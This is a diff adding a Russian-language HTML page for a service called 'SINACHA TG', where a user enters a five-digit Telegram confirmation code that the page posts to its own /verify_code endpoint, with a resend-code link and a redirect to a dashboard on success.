@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение | SINACHA TG</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #00ff88;
+            --primary-dark: #00cc6a;
+            --secondary-color: #00ffcc;
+            --accent-color: #66ffee;
+            --background-color: #0a0f1a;
+            --card-background: rgba(16, 23, 42, 0.95);
+            --success-color: #00ff88;
+            --error-color: #ff3366;
+            --text-color: #ffffff;
+            --warning-color: #ffa07a;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--background-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 20%, rgba(0, 255, 136, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 80% 80%, rgba(0, 255, 204, 0.15) 0%, transparent 40%);
+            pointer-events: none;
+            z-index: 0;
+            animation: gradientMove 15s ease infinite;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            z-index: 1;
+            position: relative;
+        }
+
+        .card {
+            background: var(--card-background);
+            border-radius: 24px;
+            padding: 2rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transform: translateY(0);
+            animation: cardAppear 0.6s ease-out;
+        }
+
+        @keyframes cardAppear {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto;
+            background: var(--primary-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            animation: logoGlow 3s ease-in-out infinite;
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: var(--primary-color);
+            filter: blur(15px);
+            opacity: 0.5;
+            z-index: -1;
+        }
+
+        .logo i {
+            font-size: 2.5rem;
+            color: var(--background-color);
+        }
+
+        .title {
+            color: var(--primary-color);
+            font-size: 2rem;
+            font-weight: bold;
+            margin: 1rem 0;
+            text-align: center;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+
+        .subtitle {
+            color: var(--text-color);
+            text-align: center;
+            margin-bottom: 2rem;
+            opacity: 0.8;
+        }
+
+        .code-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .code-input {
+            width: 3rem;
+            height: 4rem;
+            text-align: center;
+            font-size: 1.5rem;
+            background: rgba(0, 0, 0, 0.2);
+            border: 2px solid rgba(0, 255, 136, 0.2);
+            border-radius: 12px;
+            color: var(--text-color);
+            transition: all 0.3s ease;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 1rem;
+            border: none;
+            border-radius: 12px;
+            background: var(--primary-color);
+            color: var(--background-color);
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 300px;
+            height: 300px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            transition: transform 0.5s ease;
+        }
+
+        .btn:hover::before {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
+        }
+
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .status-message {
+            margin-top: 1rem;
+            padding: 0.75rem;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 0.9rem;
+            display: none;
+        }
+
+        .status-message.info {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary-color);
+        }
+
+        .status-message.success {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--success-color);
+        }
+
+        .status-message.error {
+            background: rgba(255, 51, 102, 0.1);
+            color: var(--error-color);
+        }
+
+        .status-message.warning {
+            background: rgba(255, 170, 0, 0.1);
+            color: var(--warning-color);
+        }
+
+        .resend-link {
+            display: block;
+            text-align: center;
+            margin-top: 1rem;
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 0.9rem;
+            opacity: 0.8;
+            transition: all 0.3s ease;
+        }
+
+        .resend-link:hover {
+            opacity: 1;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+
+        @keyframes logoGlow {
+            0%, 100% {
+                box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(0, 255, 136, 0.8);
+            }
+        }
+
+        @keyframes gradientMove {
+            0% {
+                background-position: 0% 0%;
+            }
+            50% {
+                background-position: 100% 100%;
+            }
+            100% {
+                background-position: 0% 0%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo-container">
+                <div class="logo">
+                    <i class="fab fa-telegram-plane"></i>
+                </div>
+                <h1 class="title">SINACHA TG</h1>
+            </div>
+            
+            <p class="subtitle">Введите код подтверждения, отправленный в Telegram</p>
+            
+            <form id="verifyForm">
+                <div class="code-input-container">
+                    <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
+                </div>
+                
+                <button type="submit" class="btn" id="submit-button">
+                    <i class="fas fa-check"></i> Подтвердить
+                </button>
+            </form>
+
+            <div id="error-message" class="status-message error hidden"></div>
+            <div id="status-message" class="status-message info hidden"></div>
+            
+            <a href="#" class="resend-link" onclick="handleResendCode(event)" id="resendLink">
+                <i class="fas fa-redo"></i> Отправить код повторно
+            </a>
+        </div>
+    </div>
+
+    <script>
+        // Автоматический переход между полями ввода
+        document.querySelectorAll('.code-input').forEach((input, index) => {
+            input.addEventListener('keyup', (e) => {
+                if (e.key >= '0' && e.key <= '9') {
+                    if (index < 4) {
+                        document.querySelectorAll('.code-input')[index + 1].focus();
+                    }
+                } else if (e.key === 'Backspace') {
+                    if (index > 0) {
+                        document.querySelectorAll('.code-input')[index - 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keypress', (e) => {
+                if (e.key < '0' || e.key > '9') {
+                    e.preventDefault();
+                }
+            });
+
+            // Обработка вставки
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = e.clipboardData.getData('text');
+                const numbers = paste.match(/\d/g);
+                if (numbers) {
+                    document.querySelectorAll('.code-input').forEach((input, i) => {
+                        if (numbers[i]) {
+                            input.value = numbers[i];
+                        }
+                    });
+                }
+            });
+        });
+
+        function showError(message) {
+            const errorDiv = document.getElementById('error-message');
+            errorDiv.textContent = message;
+            errorDiv.classList.remove('hidden');
+            setTimeout(() => {
+                errorDiv.classList.add('hidden');
+            }, 5000);
+        }
+
+        function showStatus(message, type = 'info') {
+            const statusDiv = document.getElementById('status-message');
+            statusDiv.textContent = message;
+            statusDiv.className = `status-message ${type}`;
+            statusDiv.classList.remove('hidden');
+            
+            if (type !== 'error') {
+                setTimeout(() => {
+                    statusDiv.classList.add('hidden');
+                }, 5000);
+            }
+        }
+
+        async function submitCode(event) {
+            event.preventDefault();
+            
+            const codeInputs = document.querySelectorAll('.code-input');
+            const code = Array.from(codeInputs).map(input => input.value).join('');
+            
+            if (code.length !== 5) {
+                showError('Пожалуйста, введите все 5 цифр кода');
+                return;
+            }
+            
+            const submitButton = document.querySelector('button[type="submit"]');
+            const originalText = submitButton.textContent;
+            submitButton.disabled = true;
+            submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Проверка...';
+            
+            try {
+                const response = await fetch('/verify_code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ code })
+                });
+
+                const data = await response.json();
+                
+                if (data.success) {
+                    showStatus('Успешная авторизация!', 'success');
+                    // Небольшая задержка перед перенаправлением
+                    setTimeout(() => {
+                        window.location.href = data.redirect || '/dashboard';
+                    }, 1500);
+                } else {
+                    if (data.code_resent) {
+                        showStatus('Код истек. Мы отправили новый код.', 'warning');
+                        // Очищаем поля ввода
+                        codeInputs.forEach(input => input.value = '');
+                        codeInputs[0].focus();
+                    } else {
+                        showError(data.error || 'Произошла ошибка при проверке кода');
+                        // Очищаем поля ввода при неверном коде
+                        codeInputs.forEach(input => input.value = '');
+                        codeInputs[0].focus();
+                    }
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showError('Произошла ошибка при отправке запроса');
+            } finally {
+                submitButton.disabled = false;
+                submitButton.textContent = originalText;
+            }
+        }
+
+        document.getElementById('verifyForm').addEventListener('submit', submitCode);
+
+        async function handleResendCode(event) {
+            event.preventDefault();
+            
+            const link = event.target.closest('a');
+            const originalText = link.innerHTML;
+            
+            try {
+                link.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
+                link.style.pointerEvents = 'none';
+                
+                const response = await fetch('/resend_code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showStatus('Новый код отправлен!', 'success');
+                    link.style.display = 'none';
+                    // Очищаем поля ввода
+                    const inputs = document.querySelectorAll('.code-input');
+                    inputs.forEach(input => input.value = '');
+                    inputs[0].focus();
+                } else {
+                    showError(data.error || 'Ошибка при отправке кода');
+                    if (data.wait_time) {
+                        showStatus(`Подождите ${data.wait_time} перед следующей попыткой`, 'warning');
+                    }
+                }
+            } catch (error) {
+                showError('Ошибка сервера. Попробуйте позже.');
+                console.error('Error:', error);
+            } finally {
+                link.innerHTML = originalText;
+                link.style.pointerEvents = 'auto';
+            }
+        }
+
+        function enableResendButton() {
+            const link = document.getElementById('resendLink');
+            link.style.display = 'block';
+            link.style.opacity = '1';
+            link.style.pointerEvents = 'auto';
+        }
+
+        // Добавляем стили для предупреждений
+        const style = document.createElement('style');
+        style.textContent = `
+            .status-message.warning {
+                background: rgba(255, 170, 0, 0.1);
+                color: var(--warning-color);
+            }
+        `;
+        document.head.appendChild(style);
+
+        // Фокус на первое поле при загрузке
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelector('.code-input').focus();
+        });
+    </script>
+</body>
+</html>
